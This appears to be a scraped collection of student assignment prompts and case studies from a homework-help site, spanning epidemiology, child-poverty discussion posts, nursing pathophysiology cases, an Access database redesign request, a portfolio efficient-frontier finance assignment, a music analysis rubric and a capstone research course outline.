week 1 ass:   The true story of the eleven | Human Resource Management," 
The true story of the eleven blue men by Berton Roueché is one of the staple readings for many who begin the study public health and epidemiology. The story takes place in late 1944 and centers upon eleven men who, aside from their breakfast location, have little to do with one another. However, what makes this story unique and of interest still today is that it highlights the speed and importance of a proper epidemiologic investigation.
After reading, answer the following questions:

Describe the 13 steps of an outbreak investigation and connect them to this particular event in 1944.
    
That is, for each step highlight where in the event a particular step occurred.


Assess and draw the epidemic curve for this incident.

4.1d:   Respond to two colleagues. C | Biology," 
Respond to two colleagues. Choose a colleague from a different state and compare the characteristics around child poverty in one of the following ways.

Explain how an approach to child poverty in your state (Florida) could be applied to or benefit your colleague’s state.
Explain how an approach to child poverty from your colleague’s state could be applied to your state  (Florida).

1AU- 
Explain the importance of understanding the child poverty rate.
      As a social work or any professional, it is critical to know and understand the child poverty rate. This is due to the fact that it can impact an individual throughout their life. A social worker that effectively understand the child poverty rate is more equipped to advocate for policies and social equality, upholding human rights, helping people access resources, and positively impact a child's overall wellbeing.
Identify the child poverty rate in your state.
      According to the Annie E. Casey Foundation, North Carolina has a poverty rate of 18% in 2021. Fortunately, this rate decreased when compared to it being 20% in 2019 which is great news! 
Describe an important characteristic of your state’s poverty rates.
     An important characteristics to note of North Carolina's state poverty rate is that despite the increase of children whose parent's lack secure employment, there was not also an increase in the poverty level. This could indicate that the state is providing services in order to help those that are experience difficulties due to unemployment. 
Explain one contributing factor to child poverty in your state.
I think that there are several contributing factors to child poverty in North Carolina. One of the main ones that I see falls under children whose parents lack secure employment. In addition to this, the higher cost of childcare could also contribute to child poverty as well due to lack of flexible and consistent income. The cost of living has also increased which could be a factor to consider as well.

2HE- 
Understanding the child poverty rate is crucial because it provides insight into the effectiveness of social welfare policies, society's responsibility towards vulnerable populations, and the translation of these policies at the state level. It reflects the number of children living under the economic threshold that defines poverty, which has direct implications for their health, education, and future opportunities.
According to the Annie E. Casey Foundation, West Virginia has a child poverty rate of 25% in 2022. In West Virginia, the child poverty rate is a significant concern. According to the 2022 KIDS COUNT Data Book, West Virginia ranked 42nd among the 50 states in overall child well-being  (Child Poverty, n.d.). This ranking indicates that children in West Virginia face greater challenges compared to many other states in the nation.
An important characteristic of West Virginia's poverty rates is the increasing number of children living in areas of concentrated poverty. West Virginia is one of ten states where this troubling trend is observed, which can lead to compounded disadvantages for the affected children (Douglas, 2019).
One contributing factor to child poverty in West Virginia is the economic structure of the state, which has traditionally relied heavily on industries such as coal mining. Fluctuations in these industries can have a significant impact on employment rates and family incomes, which affects the poverty rate among children. The opioid epidemic has also had a profound and multifaceted impact on West Virginia, particularly affecting children and their families. The complex interplay of poverty, low education, and high unemployment rates in the state has been exacerbated by the opioid crisis, creating a cycle that contributes to sustained child poverty (Lester et al., 2023).
In conclusion, the child poverty rate in West Virginia is a topic that deserves attention and action. It is a measure that can guide policymakers and community leaders in developing targeted strategies to improve the well-being of children and to address the root causes of poverty in the state.

Article Review : to locate a peer reviewed jour | Computer Science,"to locate a peer reviewed journal related to the topic of your interest. The journal article should have been published recently (within the past 2-3 years) and should feature material that is directly related to the course material. Read the journal article thoroughly so you can discuss it. 

You will then prepare an article review related to the topic that you researched in the Learn material from the assigned module. The Article Review that you create must be at least 750 words and be formatted according to APA style. 

Use the guide below for example

1.	Bibliographical Reference:
a.	Create a single bibliographical entry in APA style in the first section of your Article Review Assignment paper. This should include:
i.	Detail the author(s) of the article
ii.	Name of the Journal (including volume, issue, year, page numbers, etc.)
iii.	Name of the article you are reviewing.
b.	Note – You may also choose to identify the article you are reviewing (i.e. – The focus of this review will be “Article Name” published in “Journal Name” in “Year/Month”) and then simply cite it in a bibliographical entry at the end (see section 7). 

2.	Objectives:
a.	After reviewing the article, use a bulleted list to identity the 3 to 5 primary points you feel the article addresses.
b.	Simply put the bulleted list of those points in your Objectives section with something to the effect of “After reviewing “Article Name” the three main points addressed by the author(s) were: 
•	Bullet one
•	Bullet two
•	Bullet three

3.	Summary:
a.	Summarize the article you reviewed in approximately 2 or 3 full paragraphs. 
b.	Do not use direct quotes at all. If you need to quote it, paraphrase what you read. 
c.	Use the bullets above (section 2b) to structure what you wish to discuss in this summary (i.e. – In the first paragraph, summarize the article section which addresses the first bullet in 2b and so on).


4.	Results:
a.	Now that you have read this article and summarized it, what do you feel that a reader can learn about the topic from the article?
b.	Using bullet points, highlight the things you feel like you learned more about after reading this article. It’s best to keep this list to a maximum of 5 bullets. 
c.	Note – these bullets should not be identical to the bullets in the Objective Section (2b). 

5.	Critique:
a.	Use this section to provide an academic critique of the article. 
i.	How well (or poorly) was this article written? 
ii.	Did it accomplish the objectives it set out to do (think back to the Objectives section)?
iii.	Why or why not?
b.	Explain your opinion and offer some additional sources (no more than one or two) to support that opinion. 
c.	When possible, address the subject matter from a biblical perspective (e.g. – the Bible teaches us to… and this article addresses that by…)

6.	Questions:
a.	List a minimum of 3 (no more than 5) questions that arose from the reading of this article in a numbered list. 
b.	Consider any thing you feel like you should have learned from the article but did not. 
c.	Note – These questions may spark your desire to review other matter on the topic and may even be used as a starting point for one of your two research papers (though this is not required). 

7.	Bibliography:
a.	You need to use one other source to support or deny your opinion and if you chose to only identify the article in section 1, you will want to make a bibliography.

Modeling Analytics : Problem 1 In the LOGO Producti | Management,"Problem 1
In the LOGO Production Expanded problem (with 10 products, done in Homework 2 -- attachedl), we have modeled the constraint that each product can only be produced in at most one plant in class. Now consider the alternative scenario where there are no restrictions in the number of plants to use for each product, but instead, there is a $100,000 fixed cost for setting up making each product at each plant. For example, if Santa’s Grotto is only produced at Plant 1 but not Plant 2, a fixed cost of $100,000 is incurred; if it is produced at both Plant 1 and Plant 2 (regardless of actual quantities produced), a fixed cost of $200,000 is incurred; and if the product is not made at all (i.e., not sold), there are no fixed cost for this product.
Model this in your spreadsheet and solve for the optimal solution. Hint: this is related to the integer programming model.

Population Health Nursing week 3 
Epidemiological case study 
The Epidemiological Case Study is an interactive exercise developed to teach epidemiologic principles and practices. The case study is based on real-life outbreaks and public health problems and was developed in collaboration with the original investigators and experts from the Centers for Disease Control and Prevention (CDC). The case study requires students to apply their epidemiologic knowledge and skills to problems confronted by public and community health practitioners at the local, state, and national levels. 
 
Navigating a Foodborne Outbreak: Preparation for Interprofessional Practice is a self‐paced, interactive learning module that demonstrates the importance of interprofessional practice among health professionals to improve and protect population health in the context of a foodborne outbreak. 
The module will take approximately 90 minutes to two hours to complete, depending on the level of previous exposure to the content and the learner's interest in exploring the optional reference resources.  
You may choose to complete the module in one session or pause and return to the module, completing it in multiple sessions.  The module is divided into three chapters:  one set in an outpatient clinic, one at a local public health department and one at a multidisciplinary meeting after the outbreak has been resolved.  
The foodborne illness scenario is based on an actual multi‐state food-borne outbreak that occurred in 2015-2016, but the details of the patients, clinicians, and the local health department are fictional.  Any similarities to individuals or settings are coincidental.    
You will take a preliminary quiz to assess your knowledge of the content before beginning the module and will complete a quiz after completing the module to evaluate what you have learned.  You will receive a  digital certificate upon completion of the module that will be uploaded to dropbox.

Total points possible: 80
             points
        
Preparing the assignment:
Follow these guidelines when completing this assignment. Speak with your faculty member if you have questions.
1) Students will use the CJSim™ Unit Census document (found in the CJSim™ Access in Canvas) to identify the assigned client. CJSim™ Assignments per course:
a. For students who are in 
            NR 228: Nutrition, complete only the client below:
        
· Client: Jenna Batch (Surgical Care Unit)
b. For students who are in 
            NR 283: Pathophysiology, complete one of the following clients:
        
· Client: Jake Abbott (Fundamentals Unit)
· Client: Josie Brennan (Fundamentals Unit)
· Client: Jolene Sigmund (Pathophysiology Unit)
· The use of a nasogastric (NG) tube is mentioned during the Jolene Sigmund CJSim™. An NG tube is inserted through the nose into the stomach and can be used to decompress the stomach by removing gastric contents and/or administer medications.
2) Students will care for the CJSim™ client as if they are caring for a living, breathing client. This includes a thorough review of the electronic health record (EHR).
3) Students need to meet two criteria for each CJSim™ interaction:
a. Score at least 85% on each attempt.
b. Spend at least 15 minutes on each interaction. 
Note: CJSim™ does not have a timer, please ensure you set a timer and have the screenshot with the 15 minutes per attempt.
4) Students may retake CJSim™ cases until the two criteria are met.
5) Resources available to support successful completion of this assignment include: 
a. The BSN Program Library Guide, available using a link on the left navigation bar in Canvas, includes diagnosis and pharmacology resources, as well as the Made Incredibly Easy books.

Eleanor is a 77-year-old white female resident of a skilled nursing facility. Recently her daughter requested an evaluation from the staff psychologist because she noticed that her mother’s Alzheimer’s symptoms appeared to be getting worse. Eleanor was admitted to the facility six months ago with moderately severe cognitive and physical decline and had to be placed in a skilled facility since she could no longer manage herself at home. Her daughter is a single mother of four teens and works too many hours to care for her mother in her home. She had attempted to care for her until Eleanor left the stove on, resulting in a minor kitchen fire. Eleanor has no history of mental illness, but she began to show signs of cognitive decline in her late fifties. The symptoms became much more pronounced after her husband’s death five years ago.
Recently her daughter and other members of the nursing staff noticed that Eleanor has become rather restless and combative. When she gets confused over her surroundings, she wanders through the halls attempting to open fire doors. When nurses attempt to redirect her back to her room, she swears at them and even struck one of them in the face. Her PCP authorized the use of restraints one day after she managed to wander out the front door and was found standing in the middle of the street trying to take a dog away from a woman who was walking it. She yelled at the woman, telling her that she needed the dog to protect her from people who were stealing her clothing in the nursing home.

Microsoft Access Application Redesign,"I would like a Microsoft Application expert to completely redesign the following Application. It is an application for a trucking company and needs a complete design and functionality do-over. Firstly the login button needs a checkmark or show password option that will allow the user an option to see their password as it is being typed. Similarly, the buttons or forms on the main menu needs to be modified so that when the user clicks on the button or the form it should open in the same tab instead of opening in a new window. There is an extra hauled invoice table that is the exact copy of the invoice table therefore the hauled invoice can be deleted and the invoice table should be used to generate reports. There should be a print functionality button that will print the invoice and other reports after it is generated. This app is for a small business and the client is not happy with the visual appearance of the app (UI) so it needs to be modified and designed in such a way that looks both visually appealing and is easier to use. Having all the buttons or forms of the main menu or dashboard in one area would also help. Some of the requirements are:
 
INPUT:

The input forms that will be most important will be to enter the data from each load immediately after it has been delivered.
There will need to be a form to enter information about the equipment, trucks and trailers.
Form to enter new driver information
Form to create an invoice for each load that has been hauled.

REPORTS:

A report to show all loads hauled for each week.
A report to show all loads hauled for each driver each week.
A report to show maintenance shown for all trucks and trailer probably monthly.
A report to show a driver’s payroll for each week.  It should show all the loads they hauled each week with the pay being 25% of the total hauled each week.  It should show the taxes withheld each week.

I have provided a sample paper version of what the form should look like when it is printed.
The query needs to be worked on as well to function according to the tables. All the names of the forms and table should be organized and sorted. The current version has the tables names capitalized and the forms are not aligning with each other which needs to be fixed. ",,,,Computer Science,It,https://www.sweetstudy.com/questions/microsoft-access-application-redesign

FN625: Financial Risk Analysis 



 
Assignment 1 

(Please read all instructions and notes very carefully) 



 
Portfolio Choice and Performance Attribution 



 
Feb 05, 2023 



 
Required tasks: 

1. Familiarize yourself with the content of the data library on Professor Kenneth French’s 

webpage by reading the online legends and help. The web address of the data library is the 

following: 

http://mba.tuck.dartmouth.edu/pages/faculty/ken.french/data_library.html 

2. Then, select data from January 1963 to December 2023 on the 17 industry portfolios 

(value-weighted) and carry out the following analysis: 

a. Sketch the monthly MV efficient frontier of these portfolios using first the sample 

estimates of the required means and variance-covariance matrix. 

b. On the frontiers you constructed, highlight the points corresponding to the global 

minimum variance portfolio and to the tangency portfolio, assuming a risk-free rate 

equal to its average over the sample period. For these portfolios, also compute and 

report the mean excess-return, volatility and Sharpe ratio. 

c. Compare and contrast the frontiers you constructed. How would you explain their 

differences? 

3. Next, choose one stock from each of the 17 industries and repeat the analysis above. 

Compare and contrast the two pairs of MV efficient frontiers you constructed. How would 

you explain their differences? 

4. Select data for the appropriate sample period on the risk-free rate (included among the so- 

called “Fama and French factors”, and available for download from the same data library) 

and sketch the monthly MV efficient frontier for the 17 industry portfolios and the risk- 

free asset, using sample estimates of the required means and variance-covariance matrix. 




Page 2 of 5  











Compare and contrast this frontier to the ones previously constructed, after having 

explained the sample period for which you obtained data on the risk-free rate. 

5. Repeat the analysis required in the item just above (i.e., in question 4) using the Fama and 

French factor-mimicking portfolios, also available from the webpage of Prof Kenneth 

French, in place of the industry portfolios. Do so first using the so called “Fama/French 3 

Factors” and then the “Fama/French 5 Factors (2x3)” mimicking portfolios (See Fama and 

French, 1993, ”Common Risk Factors in the Returns on Stocks and Bonds,” Journal of 

Financial Economics, and Fama and French, 2014, “A Five-Factor Asset Pricing Model” 

for a complete description of the factor returns). Compare the resulting efficient frontiers 

to the ones previously obtained. How would you explain their differences? 

6. Repeat the above analysis (as specified in the item just above, namely question 5) using 

suitable “practical proxies” for the Fama and French factor-mimicking portfolios in place 

of the Fama and French factor-mimicking portfolios themselves. These practical proxies 

should be highly investable, keeping transaction and execution costs in mind. That is, they 

should be investable by the average portfolio manager, not necessarily the highly 

sophisticated portfolio manager capable of replicating the actual factor-mimicking 

portfolios. You may look for such proxy portfolios by checking out the websites of the 

main futures exchanges (e.g., look for futures on small caps, such as the Russell 2000 Index 

mini futures, and value/growth stocks) or even look for suitably focused ETFs (exchange 

traded funds).1 In particular, try and find ways to work around the difficulty of short-selling 

or minimize the associated costs. For ideas, check out this web-article: 

http://money.usnews.com/investing/articles/2016-06-07/why-investors-should-consider- 

small-cap-stocks 

Do so at least for “practical proxies” for the “Fama/French 3 Factors” and, ideally, also for 

the “Fama/French 5 Factors (2x3)” mimicking portfolios, for as long a sample period for 

which you can find data, making sure that the last observation is for December 2019 or 

later (i.e., do not work with ‘dead’ series). To work around the lack of long time series on 

suitable “practical proxies” (e.g., the Russell 2000 Index mini futures), you may use the 

time series on a closely correlated asset or portfolio (e.g., the stock index underlying the 

Russell 2000 Index mini futures, available since 1978), possibly after showing some 

evidence on the strength of the correlation. 

Compare and contrast the resulting efficient frontiers for the “practical proxies” to the ones 

for the corresponding factor mimicking portfolios (make sure both frontiers are estimated 

using the same sample period), explaining and/or commenting as appropriate. 

7. Re-estimate the monthly frontiers for the 17 industry portfolios and for the “Fama/French 

5 Factors (2x3)” mimicking portfolios over two contiguous time periods of equal length, 

one ending in December 1993 and the other one ending in December 2023, 

including the risk-free asset in the investment opportunity set. Pick at least one portfolio 



1 See, for example, the approach adopted by Faff (2003) [Faff, R.W., 2003, “Creating Fama and French Factors with 

Style”. Financial Review 38(2), 311-322]. 




Page 3 of 5  











from each of the frontiers estimated in the first period and, for the portfolios thus selected, 

compare the performance during this period to the performance during the second period. 

Do these portfolios remain on the efficient frontier out-of-sample? 

8. Then, for at least some of the assets previously considered, repeat the above analysis 

subject to any constraint and/or by applying any method, approach or technique (e.g., 

adding assets to better exploit the benefits of diversification, relying on the global 

minimum variance portfolio, resampling, etc.) that you believe might be of interest and 

might offer valuable insight from an investment management point of view. 

9. Use the market portfolio, the practical proxies and the tangency portfolios (as appropriate) 

on the various efficient frontiers you constructed above to assess the performance of 

three mutual funds of your choice, commenting on the results. A good source of data on 

mutual funds is Yahoo Finance. Please see the Appendix for help on how to access data on 

Yahoo Finance. 

Provide a soft copy report containing your findings, which should be appropriately tabulated so 

as to maximize their legibility, any required evaluation and discussion of your findings and, 

when appropriate, a description of the methodology adopted. The submitted report should be 

attached to the appropriate submission   form,   which   should   closely adhere to the template 

provided in Moodle and clearly provide   all   information required therein, including the 

assignment number, name and student number. 

The maximum length of the report should be 3000 words, including tables and figures (and 

everything else). Do not neglect to cite references as appropriate (of course, the bibliography 

is included in the word count). To stay within the word count, it will be important to organize 

your report appropriately (e.g., making appropriate use of tables, avoiding repetitions, etc.). 

Workings by way of MS Excel spreadsheets,  M a t l a b ,  R code and data should be a d d e d  

t o  M o o d l e  p a g e  e-mailed to     e-mail address: [email protected]. Although grades are 

solely based on your report, the workings are required to verify all calculations. In the email title, 

you should indicate FN625: Assignment 1.2 

The weighting on the overall module grade of this assignment are as specified in the course 

outline. 

 
2 Please note that this is a requirement and, if not fulfilled, I will not accept the submission, applying any relevant late 

submission penalty until a proper submission is made.

Notes: 

• The required tasks in the above list are, to a large extent, in a sequential order, in the sense that 

the initial ones are necessary for the subsequent ones. Hence, if you run out of time, it is better 

to carry out the earlier ones to the best of your ability rather than trying to do everything to a 

lesser standard. 

• Clarity is of paramount importance and lack thereof will be penalized heavily. Essentially, as 

in real world endeavors, unclear answers and discussion will amount to not having provided 

the required answer/discussion. Hence, try and privilege clarity and quality over quantity. For 

example, if you are running out if time, it is better to address well a few questions than to 

attempt to address them all in a poor and, hence, necessarily obscure manner. 

• All the relevant information for the assignment is provided in this document and the course 

outline. If an aspect of the analysis is not specified in either document, it means that it is left 

for students to make a choice on it, in light of the theory covered in the course. 

• Students are required to make and motivate any such choice relying on the insight offered by 

the theory covered in the course and relevant references. The soundness of such choices, 

evaluated in the light of available theory and empirical evidence, will be assessed and 

contribute to the overall mark. The more advanced aspects of the assignment also require a 

certain amount of autonomous research, which will play an especially important role in the 

assignment of higher marks. 

• Submissions should contain, as appropriate, a literature review. The latter should strive to offer 

a comprehensive and systematic, yet succinct, review and discussion of academic and 

practitioners contributions to the body of knowledge on issues and topics examined during the 

course that are relevant to address the issues at hand, with the aim to expand and offer 

additional substantial insight compared to the insight and level of knowledge developed by the 

course material (including lectures). 

• In preparing the report, try and replicate as closely as possible the layout and structure (though 

subject to the applicable maximum length restriction) of academic papers that evaluate the 

performance of alternative portfolio construction methodologies. A good yet nice and readable 

example is the article by Stevenson (2002) titled “Ex-Ante and Ex-Post Performance of 

Optimal REIT Portfolios” (among the readings in Moodle). You might also take heed from 

industry reports that do something similar, which often have nice and witty ways of making 

insightful points, though strive to aim at a level of clarity and rigor comparable to the academic 

papers. The paper by Rob Arnott of Research Affiliates (titled “How Can Smart Beta Go 

Horribly Wrong”) is a good example of clear and compelling industry report: 

https://www.researchaffiliates.com/en_us/publications/articles/442_how_can_smart_beta_go_horribl 

y_wrong.html 




Page 5 of 5  











Please keep in mind however that, if you lack the insight of an industry maverick (that comes 

with many years of first-hand experience), the academic format might be a safer option as it is 

designed to facilitate making a point in an effective way relying only on research, without 

needing any special experience of the subject matter. An academic researcher gains insight 

from research, not necessarily experience, so it is a situation closer to the one of a typical 

student. 

• Appropriate use of tables and figures, as in academic papers and rigorous industry reports, is 

of crucial importance to attain the required clarity. They should be thoughtfully designed to 

maximize clarity and impact. For example, annotate your tables and figures to help the reader 

gain an immediate understanding of the findings reported therein. Also, try and condense your 

findings in as few tables and figures as possible, to help the reader see the overall picture 

emerging from your study. 

• Mutatis mutandis (i.e., with the appropriate adaptation) and unless otherwise specified, all the 

above notes apply to subsequent assignments too. 





 
Appendix – Accessing data in Yahoo Finance 

On Yahoo Finance, find two ETFs (Exchange Traded Funds) that have been listed for at least a year and 

download the time series of closing prices for the last 251 trading days (if any one of the ETFs does not 

trade on a given trading day, assume that the closing price is the same as for the previous trading day).

MUS 223 Milestone Two Guidelines and Rubric
Musical Interpretation
For Milestone Two, you will submit your musical interpretation. Begin your interpretation of the work by discussing your thoughts on the work and the musical elements that created the impressions you received from the music. Some musical analysis is necessary. For instance, you will identify which musical instruments are used, dynamics, tempo, form, and so on, as discussed in Module One. This assignment should be at least two pages long.
Specifically the following critical elements must be addressed:

Musical Interpretation: As you listen to the work, pay attention to the different musical elements and how they work together to create the work. As you listen, does the music create any images or stories in your mind or remind you of anything? Does it create any feelings or emotions in you?

                    
Identify each of the musical elements of the composition. Explain how each musical element is used and why they are important (e.g., the work of art’s dynamics, rhythm, tempo, form, etc.).
Analyze how the musical elements were employed in the work to create specific impressions. Did the elements change in different sections of the work? Was the melody more important in one section and the tempo or rhythm in another? Were different elements used to create different ideas, thoughts, feelings, emotions, or pictures in your mind?
Summarize a personal interpretation of the music. What about the piece first attracted you to it? The melody, rhythm, harmony, or something else? How did the chosen piece’s musical elements personally affect you? Is there a mood or emotion evoked by the work? Did it create a story or any images in your mind, or was it just enjoyable to listen to? Did you have different thoughts and/or feelings in different sections of the musical work? Does the emotion, feeling, or picture change as you listen to the entire work, or is it similar throughout? Have you heard the piece in the past, and if so, in what context?



What to Submit
Milestone Two should follow these formatting guidelines: Use of Part 1 of Connect for musical elements and terminology, 2 pages minimum, double spacing, 12-point Times New Roman font, one-inch margins, and citations in APA style.

Hematopoietic and cardiovascular," 
Hematopoietic:
J.D. is a 37 years old white woman who presents to her gynecologist complaining of a 2-month history of intermenstrual bleeding, menorrhagia, increased urinary frequency, mild incontinence, extreme fatigue, and weakness. Her menstrual period occurs every 28 days and lately there have been 6 days of heavy flow and cramping. She denies abdominal distension, back-ache, and constipation. She has not had her usual energy levels since before her last pregnancy.

Past Medical History (PMH):
Upon reviewing her past medical history, the gynecologist notes that her patient is a G5P5with four pregnancies within four years, the last infant having been delivered vaginally four months ago. All five pregnancies were unremarkable and without delivery complications. All infants were born healthy. Patient history also reveals a 3-year history of osteoarthritis in the left knee, probably the result of sustaining significant trauma to her knee in an MVA when she was 9 years old. When asked what OTC medications she is currently taking for her pain and for how long she has been taking them, she reveals that she started taking ibuprofen, three tablets each day, about 2.5 years ago for her left knee. Due to a slowly progressive increase in pain and a loss of adequate relief with three tablets, she doubled the daily dose of ibuprofen. Upon the recommendation from her nurse practitioner and because long-term ibuprofen use can cause peptic ulcers, she began taking OTC omeprazole on a regular basis to prevent gastrointestinal bleeding. Patient history also reveals a 3-year history of HTN for which she is now being treated with a diuretic and a centrally acting antihypertensive drug. She has had no previous surgeries.

Case Study Questions

Name the contributing factors on J.D that might put her at risk to develop iron deficiency anemia.
Within the case study, describe the reasons why J.D. might be presenting constipation and or dehydration.
Why Vitamin B12 and folic acid are important on the erythropoiesis? What abnormalities their deficiency might cause on the red blood cells?
The gynecologist is suspecting that J.D. might be experiencing iron deficiency anemia.
In order to support the diagnosis, list and describe the clinical symptoms that J.D. might have positive for Iron deficiency anemia.
If the patient is diagnosed with iron deficiency anemia, what do you expect to find as signs of this type of anemia? List and describe.
Labs results came back for the patient. Hb 10.2 g/dL; Hct 30.8%; Ferritin 9 ng/dL; red blood cells are smaller and paler in color than normal. Research list and describe for appropriate recommendations and treatments for J.D.

Cardiovascular
Mr. W.G. is a 53-year-old white man who began to experience chest discomfort while playing tennis with a friend. At first, he attributed his discomfort to the heat and having had a large breakfast. Gradually, however, discomfort intensified to a crushing sensation in the sternal area and the pain seemed to spread upward into his neck and lower jaw. The nature of the pain did not seem to change with deep breathing. When Mr. G. complained of feeling nauseated and began rubbing his chest, his tennis partner was concerned that his friend was having a heart attack and called 911 on his cell phone. The patient was transported to the ED of the nearest hospital and arrived within 30 minutes of the onset of chest pain. In route to the hospital, the patient was placed on nasal cannula and an IV D5W was started. Mr. G. received aspirin (325 mg po) and 2 mg/IV morphine. He is allergic to meperidine (rash). His pain has eased slightly in the last 15 minutes but is still significant; was 9/10 in severity; now7/10. In the ED, chest pain was not relieved by 3 SL NTG tablets. He denies chills.

Case Study Questions

For patients at risk of developing coronary artery disease and patients diagnosed with acute myocardial infarct, describe the modifiable and non-modifiable risk factors.
What would you expect to see on Mr. W.G. EKG and which findings described on the case are compatible with the acute coronary event?
Having only the opportunity to choose one laboratory test to confirm the acute myocardial infarct, which would be the most specific laboratory test you would choose and why?
How do you explain that Mr. W.G temperature has increased after his Myocardial Infarct, when that can be observed and for how long? Base your answer on the pathophysiology of the event.
Explain to Mr. W.G. why he was experiencing pain during his Myocardial Infarct. Elaborate and support your answer.

Jim Crow laws in the American South,"Read the paragraph from the introduction [paragraphs 1-4].

While Black citizens could receive ""separate but equal"" treatment under the law, the reality was quite different for them. Public spaces for Black people were poor in quality compared to those for white people. In addition, Black citizens could not vote in most of the rural South. That’s because, in that area, Black citizens were required to pass a literacy test before they could vote. These literacy tests kept most Black citizens, who often received a weaker education than white citizens, from voting.

What is the MOST accurate explanation of what this paragraph means?


A
Public spaces in the South slowly became better for Black people.

B
The rural South had poor voter participation in most elections.

C
“Separate but equal” laws meant that Black people had inferior public spaces and were also kept from voting.

D

Nursing case study: Hematopoietic: J.D. is a 37 ye | Nursing,"Hematopoietic:
J.D. is a 37 years old white woman who presents to her gynecologist complaining of a 2-month history of intermenstrual bleeding, menorrhagia, increased urinary frequency, mild incontinence, extreme fatigue, and weakness. Her menstrual period occurs every 28 days and lately there have been 6 days of heavy flow and cramping. She denies abdominal distension, back-ache, and constipation. She has not had her usual energy levels since before her last pregnancy.

Past Medical History (PMH):
Upon reviewing her past medical history, the gynecologist notes that her patient is a G5P5with four pregnancies within four years, the last infant having been delivered vaginally four months ago. All five pregnancies were unremarkable and without delivery complications. All infants were born healthy. Patient history also reveals a 3-year history of osteoarthritis in the left knee, probably the result of sustaining significant trauma to her knee in an MVA when she was 9 years old. When asked what OTC medications she is currently taking for her pain and for how long she has been taking them, she reveals that she started taking ibuprofen, three tablets each day, about 2.5 years ago for her left knee. Due to a slowly progressive increase in pain and a loss of adequate relief with three tablets, she doubled the daily dose of ibuprofen. Upon the recommendation from her nurse practitioner and because long-term ibuprofen use can cause peptic ulcers, she began taking OTC omeprazole on a regular basis to prevent gastrointestinal bleeding. Patient history also reveals a 3-year history of HTN for which she is now being treated with a diuretic and a centrally acting antihypertensive drug. She has had no previous surgeries.

Case Study Questions

Name the contributing factors on J.D that might put her at risk to develop iron deficiency anemia.
Within the case study, describe the reasons why J.D. might be presenting constipation and or dehydration.
Why Vitamin B12 and folic acid are important on the erythropoiesis? What abnormalities their deficiency might cause on the red blood cells?
The gynecologist is suspecting that J.D. might be experiencing iron deficiency anemia.
In order to support the diagnosis, list and describe the clinical symptoms that J.D. might have positive for Iron deficiency anemia.
If the patient is diagnosed with iron deficiency anemia, what do you expect to find as signs of this type of anemia? List and describe.
Labs results came back for the patient. Hb 10.2 g/dL; Hct 30.8%; Ferritin 9 ng/dL; red blood cells are smaller and paler in color than normal. Research list and describe for appropriate recommendations and treatments for J.D.

Cardiovascular
Mr. W.G. is a 53-year-old white man who began to experience chest discomfort while playing tennis with a friend. At first, he attributed his discomfort to the heat and having had a large breakfast. Gradually, however, discomfort intensified to a crushing sensation in the sternal area and the pain seemed to spread upward into his neck and lower jaw. The nature of the pain did not seem to change with deep breathing. When Mr. G. complained of feeling nauseated and began rubbing his chest, his tennis partner was concerned that his friend was having a heart attack and called 911 on his cell phone. The patient was transported to the ED of the nearest hospital and arrived within 30 minutes of the onset of chest pain. In route to the hospital, the patient was placed on nasal cannula and an IV D5W was started. Mr. G. received aspirin (325 mg po) and 2 mg/IV morphine. He is allergic to meperidine (rash). His pain has eased slightly in the last 15 minutes but is still significant; was 9/10 in severity; now7/10. In the ED, chest pain was not relieved by 3 SL NTG tablets. He denies chills.

Case Study Questions

For patients at risk of developing coronary artery disease and patients diagnosed with acute myocardial infarct, describe the modifiable and non-modifiable risk factors.
What would you expect to see on Mr. W.G. EKG and which findings described on the case are compatible with the acute coronary event?
Having only the opportunity to choose one laboratory test to confirm the acute myocardial infarct, which would be the most specific laboratory test you would choose and why?
How do you explain that Mr. W.G temperature has increased after his Myocardial Infarct, when that can be observed and for how long? Base your answer on the pathophysiology of the event.
Explain to Mr. W.G. why he was experiencing pain during his Myocardial Infarct. Elaborate and support your answer.

VIRTUAL COMMUNICATION—WHAT WORKS?," Throughout the COVID-19 pandemic, nearly everyone had to adjust quickly to conducting most communication virtually, both personally and professionally. Sometimes these communications worked well; other times, they went awry or were simply ineffective. For this Discussion, you will reflect on your experience with both effective and ineffective virtual communication to help determine best practices. 
To prepare for this Discussion:

Think about both the personal and professional virtual communication you have had recently. Choose one or two interactions that were effective and one or two that were not. For each, consider specific factors that led to the effectiveness or ineffectiveness of the virtual communication in meeting its intended purpose.

Week 1

EMHS699 K001 Winter 2024 RO

Announcements  Week 1

During this course, you will accomplish a research project on an emergency &

disaster management / homeland security topic of your choice. You must gather

data, apply research concepts and analytical processes to that data, draw the

appropriate conclusions & recommendations, and produce a report of a minimum

of 50 pages that meets APA publication quality. Your final paper must provide

original knowledge to the field of emergency and disaster management and

homeland security that has not existed before. This contribution can be as large or

small as you wish to design it, as long as the contribution is original.

The first month of the course will focus on the design of your project and putting

all of the required approvals and authorizations in place. Then, you will have

approximately two months to conduct your research. The final month will be a

process of review and improvement of the final project report, at the end of which

you will have produced a product that honors your institution, your education,

your profession, and that you can truly be proud of.

A great deal of information is available in the classroom to help. Within the first

few days of the course, be sure to examine everything under every section. Read

the syllabus thoroughly. Read every assignment guideline. Look through the

resources and these lessons so that you will know where to find things when you

need them. Each area has resources that contribute to your overall research

project. 

Be sure as you familiarize yourself with the course that you take the time to look

under every section. You will find graded items under two different buttons:

'Discussions', and 'Assignments'. Read the instructions carefully and be sure to


https://myclassroom.apus.edu/d2l/home/163110


https://myclassroom.apus.edu/d2l/lms/news/main.d2l?ou=163110




complete all graded tasks.

There are several graded Discussions. To receive full credit for a discussion, you

must create an original posting, respond to a minimum of two peers, and respond

to everyone who has responded to you. These tasks MUST be accomplished during

the assigned weeks. There is no point in attempting to have a discussion after

everyone has moved on. DO NOT post a document to a discussion. You don't want

to make your input difficult for your reader to get to.

You must make a submission for every item on the Assignments page. Feedback

will be returned on every assignment. It can be found on the Assignments page,

not in the Grades section. After each grade is posted, go back to the assignments

page and read the feedback.

Here is an approximate outline for when you should be accomplishing each activity

in the project development process:

Wk1: Read the Capstone Manual and the appropriate style manual; Take the CITI

course and read the IRB requirements; Introduce yourself in the discussions.

Wk2: Develop and submit your prospectus; submit the CITI completion certificate;

submit the required IRB approval documents; upload your prospectus to the

discussion for peer review.

Wk3: Develop and submit your draft research proposal; review classmates'

projects in the discussion.

Wk4: Revise and submit your final research proposal; include the CITI certificate

and the approved IRB forms. Instructor acceptance will constitute approval to

accomplish your project.

Wk5: Develop your annotated bibliography.

Wk6: Finalize your annotated bibliography and write your literature review.

Wk7: Gather the data you will analyze.

Wk8: Finalize data gathering.




Wk9: Begin the analysis process.

Wk10: Complete the analysis process; provide a progress report in the discussion.

Wk11: Write up your research findings.

Wk12: Write your conclusions & recommendations.

